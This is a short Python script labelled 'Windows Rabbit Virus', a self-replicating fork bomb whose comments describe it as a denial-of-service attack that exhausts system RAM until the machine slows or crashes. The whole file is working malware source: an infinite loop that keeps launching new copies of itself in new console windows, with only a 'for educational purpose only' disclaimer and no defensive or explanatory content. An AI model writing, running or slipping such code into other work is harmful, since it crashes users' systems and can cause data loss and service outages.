#Windows Rabbit Virus
#RUN AT YOUR OWN RISK
#This Program will launch a denial-of-service attack where it will continually replicates itself to deplete available system RAM,
#slowing down or crashing the system due to resource starvation.

import subprocess, sys
while True:
    subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)

#For Educational Purpose Only.